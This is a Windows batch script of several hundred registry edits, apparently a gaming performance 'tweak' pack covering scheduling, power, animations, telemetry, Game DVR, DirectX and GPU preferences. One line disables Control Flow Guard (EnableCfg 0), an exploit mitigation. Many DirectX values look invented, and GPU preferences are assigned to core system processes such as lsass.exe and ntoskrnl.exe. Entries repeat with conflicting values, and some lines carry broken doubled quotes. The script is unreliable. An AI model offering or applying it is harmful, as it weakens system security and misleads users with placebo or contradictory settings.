Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillServiceTimeout" /t REG_DWORD /d "8192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MaxAnimate" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ExtendedUIHoverTime" /t REG_DWORD /d "196608" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DontPrettyPath" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DWM" /v "DWMWA_TRANSITIONS_FORCEDISABLED" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DWM" /v "DisallowAnimations" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Executive" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\ModernSleep" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d 0x00000024 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d 0x00000001 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "LazyMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "LazyModeTimeout" /t REG_DWORD /d "25000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "AlwaysOn" /t REG_DWORD /d "1" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""LatencyToleranceDefault"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""LatencyToleranceVSyncEnabled"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""LatencyToleranceFSVP"" /t REG_DWORD /d ""1"" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_AutoGameModeDefaultProfile" /t REG_BINARY /d "01000100000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_GameModeRelatedProcesses" /t REG_BINARY /d "010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabledDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInstrumentation" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInstrumentation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKCR\AllFilesystemObjects\shellex\ContextMenuHandlers\Copy To" /ve /t REG_SZ /d "{C2FBB630-2971-11D1-A18C-00C04FD75D13}" /f
Reg.exe add "HKCR\AllFilesystemObjects\shellex\ContextMenuHandlers\Move To" /ve /t REG_SZ /d "{C2FBB631-2971-11D1-A18C-00C04FD75D13}" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuCoresAlways" /t REG_DWORD /d "18" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuUtilization" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "LatencyPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuMax" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "MaxPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "MinPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "PerformancePriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "PerformanceSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuMaxPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuMaxPerformance" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuAccelerating" /t REG_DWORD /d "256" /f 
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuSpeed" /t REG_DWORD /d "256" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /ve /t REG_SZ /d "True" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "LatencySpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingPriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "LatencyPriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "CpuSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "GpuRenderingPriority" /t REG_DWORD /d "3" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "RenderingSpread" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\DirectX\GraphicsSettings" /v "SpreadPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\DirectX\{39A262FC-984B-11ED-9501-806E6F6E6963}" /v "GPMinCores" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\DirectX\{39A262FE-984B-11ED-9501-806E6F6E6963}" /v "GPUMaxCores" /t REG_DWORD /d "0" /f  
Reg.exe add "HKLM\SOFTWARE\Microsoft\DirectX\{39A262FE-984B-11ED-9501-806E6F6E6963}" /v "GPUMinCores1" /t REG_DWORD /d "0" /f  
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SecurityHealthService.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Windows.Media.BackgroundPlayback.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sfc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wusa.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\wbemtest.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wbem\scrcons.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ApplyTrustOffline.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CustomInstallExec.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\deploymentcsphelper.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\expand.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ReAgentc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RelPost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MuiUnattend.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dxdiag.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fontdrvhost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\winlogon.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ucsvc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\fltMC.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\lsass.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ntoskrnl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\services.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\smss.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\csrss.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Boot\winload.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\AggregatorHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dtdump.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\runexehelper.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rdrleakdiag.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wpr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\pacjsworker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\userinit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wininit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DeviceCensus.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dllhost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\conhost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\extrac32.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\makecab.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\svchost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\compact.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dwm.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dcomcnfg.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Locator.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Com\MigRegDB.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RpcPing.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\mtstocom.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Com\comrepl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dllhst3g.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\setupcl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\setupugc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wimserv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\chkdsk.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\chkntfs.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wsqmcons.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\autochk.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\browser_broker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\browserexport.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Boot\winresume.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\winresume.exe" /t REG_SZ /d "GpuPreference=1;" /f   
